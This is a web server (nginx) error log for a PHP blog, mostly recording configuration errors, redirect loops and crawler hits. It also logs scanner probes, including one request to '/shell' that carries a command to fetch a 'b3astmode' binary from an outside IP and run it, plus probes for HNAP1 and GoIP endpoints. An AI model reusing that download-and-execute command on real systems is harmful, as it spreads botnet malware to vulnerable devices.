2020/07/08 14:17:28 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:19:03 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:19:04 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:19:05 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:19:05 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:19:05 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:20:28 [error] 6#6: *2 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:28:19 [error] 6#6: *13 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:28:20 [error] 6#6: *13 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:28:21 [error] 6#6: *13 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/var/www/html/blog/public/index.php) is not within the allowed path(s): (/www/wwwroot/blog/:/tmp/:/proc/) in Unknown on line 0
PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted in Unknown on line 0
Unable to open primary script: /var/www/html/blog/public/index.php (Operation not permitted)" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:54:00 [error] 6#6: *34 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Namespace declaration statement has to be the very first statement or after any declare call in the script in /var/www/html/blog/public/index.php on line 13" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:54:01 [error] 6#6: *34 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Namespace declaration statement has to be the very first statement or after any declare call in the script in /var/www/html/blog/public/index.php on line 13" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:54:01 [error] 6#6: *34 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Namespace declaration statement has to be the very first statement or after any declare call in the script in /var/www/html/blog/public/index.php on line 13" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:54:51 [error] 6#6: *34 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Namespace declaration statement has to be the very first statement or after any declare call in the script in /var/www/html/blog/public/index.php on line 13" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:54:51 [error] 6#6: *34 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Namespace declaration statement has to be the very first statement or after any declare call in the script in /var/www/html/blog/public/index.php on line 13" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:54:51 [error] 6#6: *34 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Namespace declaration statement has to be the very first statement or after any declare call in the script in /var/www/html/blog/public/index.php on line 13" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:54:52 [error] 6#6: *34 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Namespace declaration statement has to be the very first statement or after any declare call in the script in /var/www/html/blog/public/index.php on line 13" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 14:54:52 [error] 6#6: *34 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Namespace declaration statement has to be the very first statement or after any declare call in the script in /var/www/html/blog/public/index.php on line 13" while reading response header from upstream, client: 113.116.107.32, server: yhlbk.com, request: "GET / HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 15:58:05 [error] 6#6: *58 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//robots.txt", client: 178.154.200.68, server: yhlbk.com, request: "GET /robots.txt HTTP/1.1", host: "www.yhlbk.com"
2020/07/08 16:20:10 [error] 6#6: *61 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.169.61, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/08 16:20:10 [error] 6#6: *62 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.169.61, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/08 16:20:11 [error] 6#6: *63 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.169.61, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/08 16:21:43 [error] 6#6: *64 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//article-3.html", client: 220.181.108.159, server: yhlbk.com, request: "GET /article-3.html HTTP/1.1", host: "yhlbk.com"
2020/07/08 17:50:22 [error] 6#6: *78 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//robots.txt", client: 95.91.76.109, server: yhlbk.com, request: "GET /robots.txt HTTP/1.1", host: "www.yhlbk.com"
2020/07/08 17:52:05 [error] 6#6: *79 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//article-9.html", client: 116.179.32.88, server: yhlbk.com, request: "GET /article-9.html HTTP/1.1", host: "yhlbk.com"
2020/07/08 18:10:51 [error] 6#6: *82 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//smb_scheduler/cdr.htm", client: 139.205.177.98, server: yhlbk.com, request: "GET /smb_scheduler/cdr.htm HTTP/1.1", host: "120.77.171.251"
2020/07/08 18:10:51 [error] 6#6: *83 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.html", client: 139.205.177.98, server: yhlbk.com, request: "GET /index.html?findcli=-1 HTTP/1.1", host: "120.77.171.251"
2020/07/08 18:10:51 [error] 6#6: *84 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//goip/cron.htm", client: 139.205.177.98, server: yhlbk.com, request: "GET /goip/cron.htm HTTP/1.1", host: "120.77.171.251"
2020/07/08 18:11:26 [error] 6#6: *85 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//data/admin/allowurl.txt", client: 39.98.124.123, server: yhlbk.com, request: "GET /data/admin/allowurl.txt HTTP/1.1", host: "yhlbk.com"
2020/07/08 18:24:45 [error] 6#6: *88 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//shell", client: 102.40.111.44, server: yhlbk.com, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+95.213.165.45/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws HTTP/1.1", host: "127.0.0.1:80"
2020/07/08 19:38:03 [error] 6#6: *111 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.173.145, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/08 19:38:03 [error] 6#6: *112 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.173.145, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/08 19:38:03 [error] 6#6: *113 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.173.145, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/08 20:24:35 [error] 6#6: *124 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//statics/css/crop.css", client: 39.101.129.127, server: yhlbk.com, request: "GET /statics/css/crop.css HTTP/1.1", host: "www.yhlbk.com"
2020/07/08 20:29:55 [error] 6#6: *125 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 139.162.88.63, server: yhlbk.com, request: "GET http://clientapi.ipip.net/echo.php?info=1234567890 HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "clientapi.ipip.net"
2020/07/08 21:45:31 [error] 6#6: *134 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 47.113.87.53, server: yhlbk.com, request: "HEAD /admin/login.php HTTP/1.1", upstream: "fastcgi://172.19.0.4:9000", host: "yhlbk.com"
2020/07/08 22:46:27 [error] 6#6: *143 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//robots.txt", client: 157.55.39.27, server: yhlbk.com, request: "GET /robots.txt HTTP/1.1", host: "yhlbk.com"
2020/07/08 22:47:01 [error] 6#6: *144 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//article-1037.html", client: 157.55.39.71, server: yhlbk.com, request: "GET /article-1037.html HTTP/1.1", host: "yhlbk.com"
2020/07/08 22:48:44 [error] 6#6: *145 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.173.145, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/08 22:48:44 [error] 6#6: *146 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.173.145, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/08 22:48:45 [error] 6#6: *147 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//home-1.html", client: 114.115.173.145, server: yhlbk.com, request: "GET /home-1.html HTTP/1.1", host: "yhlbk.com"
2020/07/08 23:08:34 [error] 6#6: *156 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//nmaplowercheck1594220913", client: 101.133.147.20, server: yhlbk.com, request: "GET /nmaplowercheck1594220913 HTTP/1.1", host: "120.77.171.251"
2020/07/08 23:08:34 [error] 6#6: *157 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//HNAP1", client: 101.133.147.20, server: yhlbk.com, request: "GET /HNAP1 HTTP/1.1", host: "120.77.171.251"
2020/07/08 23:08:35 [error] 6#6: *158 rewrite or internal redirection cycle while processing "/index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//index.php//evox/about", client: 101.133.147.20, server: yhlbk.com, request: "GET /evox/about HTTP/1.1", host: "120.77.171.251"
